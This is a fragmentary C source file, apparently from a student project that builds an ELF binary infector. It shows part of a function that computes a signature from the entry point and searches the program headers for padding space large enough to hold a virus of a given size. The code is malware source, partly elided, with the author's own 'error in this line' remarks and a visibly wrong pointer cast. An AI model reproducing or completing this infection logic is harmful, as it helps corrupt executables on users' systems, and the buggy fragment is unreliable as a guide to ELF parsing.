...
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2020/02/29 18:23:54 by plamtenz          #+#    #+#             */
/*   Updated: 2020/02/29 18:23:54 by plamtenz         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */
...
{
    const uint64_t      file_signature = /* has to be pointer '*'? */(uint64_t)((char *)entry->data + ((Elf64_Ehdr *)entry->data)->e_entry
...
char                    room_manager(t_entry *entry, uint32_t virus_size, uint64_t signature)
{
    ...
    while (++i < ((Elf64_Ehdr *)entry->data)->e_phnum)
        if (entry->saved_program->p_offset + entry->saved_program->p_filesz
                && (!next_ptload || entry->program[i]->p_offset < next_ptload->p_offset)) // error in this line
    ...
    entry->padding = 0;
    /* true : no room space */
    if (entry->saved_program->p_offset + entry->saved_program->p_filesz > ((Elf64_Addr *)next_ptload)->p_offset)
    {
